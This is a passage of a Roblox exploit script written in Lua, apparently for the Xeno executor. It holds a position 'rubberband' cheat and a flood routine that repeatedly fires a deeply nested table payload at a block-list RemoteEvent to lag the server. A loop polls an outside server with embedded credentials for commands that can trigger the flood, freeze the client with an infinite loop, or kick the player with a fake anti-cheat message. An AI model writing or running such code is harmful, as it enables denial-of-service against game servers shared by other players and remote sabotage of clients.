    if mode == "carry" then return s >= CARRY_SPEED_MIN end
    return false
end

local function doRubberband()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local vel = root.AssemblyLinearVelocity
    local horizVel = Vector3.new(vel.X, 0, vel.Z)
    if horizVel.Magnitude < 1 then return end
    local targetTime = tick() - HISTORY_SIZE
    local best = nil
    for i = 1, #posHistory do
        if posHistory[i].time >= targetTime then
            best = posHistory[i].cframe
            break
        end
    end
    if not best then return end
    root.CFrame = best
    root.AssemblyLinearVelocity = vel
end

local function stopLoop()
    if intervalThread then
        pcall(task.cancel, intervalThread)
        intervalThread = nil
    end
end

local function startLoop()
    stopLoop()
    intervalThread = task.spawn(function()
        local startTime = tick()
        local iteration = 0
        while isActive and alive() do
            while isActive and not meetsSpeedReq() do task.wait(0.05) end
            if not isActive then break end
            iteration = iteration + 1
            local targetT = startTime + (iteration * INTERVAL)
            local sleepT = targetT - tick()
            if sleepT > 0 then task.wait(sleepT) end
            if isActive and meetsSpeedReq() then doRubberband() end
        end
    end)
end

local function setMode(newMode)
    if mode == newMode then return end
    mode = newMode
    if mode then
        isActive = true
        startLoop()
    else
        isActive = false
        stopLoop()
    end
end

local PING_REMOTE_NAMES = {"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}
local PING_DEPTH = 186
local PING_POWER = 62000
local PING_DELAY = 0.0002

local function pingFindRemote()
    for _, name in ipairs(PING_REMOTE_NAMES) do
        local r = RobloxReplicated:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then return r end
    end
    for _, child in ipairs(RobloxReplicated:GetChildren()) do
        if child:IsA("RemoteEvent") and child.Name:find("Block") then return child end
    end
    return nil
end

local function pingBuildPayload(power)
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, PING_DEPTH do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(power / (PING_DEPTH + 2)), 10000)
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

local pingThread = nil
local pingActive = false

local function setPingEm(on)
    if on == pingActive then return end
    pingActive = on
    if on then
        pingThread = task.spawn(function()
            local remote = pingFindRemote()
            while pingActive and alive() and not remote do
                task.wait(0.5)
                remote = pingFindRemote()
            end
            if not pingActive or not remote then return end
            local payload = pingBuildPayload(PING_POWER)
            while pingActive and alive() do
                pcall(function() remote:FireServer(payload) end)
                task.wait(PING_DELAY)
            end
        end)
    else
        pingThread = nil
    end
end


genv.__XENO_CLEANUP = function()
    pcall(setFpsLimit, false)
    pcall(setPingEm, false)
    pcall(setMode, nil)
end


local kicked = false
local prevLagN = false
local prevLagC = false
local prevFps = false
local prevPing = false

local function poll()
    local res = httpRequest({
        Url = BASE .. "/api/public/command?site=" .. SITE_SLUG .. "&user_id=" .. LP.UserId,
        Method = "GET",
        Headers = {
            ["X-Api-Key"] = KEY,
            ["X-Site-Slug"] = SITE_SLUG,
            ["X-Site-Password"] = SITE_PASSWORD,
        },
    })
    if not res or not res.Body then return end
    local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
    if not ok2 or type(data) ~= "table" then return end

    local wantFps = (data.fps_limit == true)
    if wantFps ~= prevFps then
        prevFps = wantFps
        setFpsLimit(wantFps)
    end

    local wantPing = (data.ping_em == true)
    if wantPing ~= prevPing then
        prevPing = wantPing
        setPingEm(wantPing)
    end

    local wantN = (data.lag_n == true)
    local wantC = (data.lag_c == true)
    if wantC ~= prevLagC or wantN ~= prevLagN then
        prevLagC = wantC
        prevLagN = wantN
        if wantC then
            setMode("carry")
        elseif wantN then
            setMode("normal")
        else
            setMode(nil)
        end
    end

    if data.crash == true then
        while true do end
    end
    if data.kick == true and not kicked then
        kicked = true
        LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
    end
end

task.spawn(function() pcall(heartbeat) end)
task.spawn(function() pcall(poll) end)

task.spawn(function()
    while alive() do
        task.wait(3)
        if not alive() then break end
        pcall(heartbeat)
    end
end)

task.spawn(function()
    while alive() do
        task.wait(0.5)
        if not alive() then break end
        pcall(poll)
    end
end)